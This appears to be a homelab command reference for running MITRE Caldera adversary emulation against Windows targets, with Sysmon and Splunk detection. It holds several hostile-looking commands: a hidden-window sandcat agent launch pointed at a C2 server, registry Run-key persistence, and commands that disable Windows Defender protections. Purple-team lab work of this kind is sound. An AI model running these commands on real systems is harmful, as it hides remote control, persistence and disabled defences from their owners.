# Caldera — Commands Reference

Quick copy-paste reference. Full narrative is in `vmware/06-caldera.md`.

## Install (Ubuntu / venv)

```
git clone https://github.com/mitre/caldera.git
cd caldera
git submodule update --init --recursive

# build the web UI (Magma):
cd plugins/magma
npm install
npm run build

# run the server:
source venv/bin/activate
python3 server.py --insecure
```

> `conf/default.yml` is untracked in git in this version — don't delete it assuming it regenerates. If it's lost:
> ```
> wget -O conf/default.yml https://raw.githubusercontent.com/mitre/caldera/master/conf/default.yml
> ```

## Firewall rule for agent traffic (C2)

| Field | Value |
|---|---|
| Action | Pass |
| Interface | LAN (Users) |
| Protocol | TCP |
| Source | LAN net |
| Destination | 192.168.30.35 (Caldera) |
| Destination port | 8888 |
| Description | Allow Caldera agent traffic (C2) |

## Deploy a sandcat agent (PowerShell)

```
Start-Process -FilePath "C:\Users\Public\sandcat.exe" -ArgumentList "-server http://192.168.30.35:8888 -group red" -WindowStyle hidden
```

## Manual Command — Registry persistence test (T1547.001)

Generates Sysmon Event ID 13 (rare and easy to spot, unlike the very common Event ID 1):

```powershell
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Force | Out-Null;
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "CalderaDemo" -Value "C:\Windows\System32\calc.exe"
```

Verify in Splunk:

```
index=main EventCode=13 TargetObject="*CalderaDemo*"
```

Full detection chain: Caldera (Manual Command) → PowerShell on the target → Registry change → Sysmon (Event ID 13) → Splunk (index=main).

## Disable Windows Defender on targets (exercise only)

Tamper Protection must be turned off in the UI first (can't be done via PowerShell/script):

```
Windows Security -> Virus & threat protection -> Manage settings -> Tamper Protection -> Off
```

then:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```
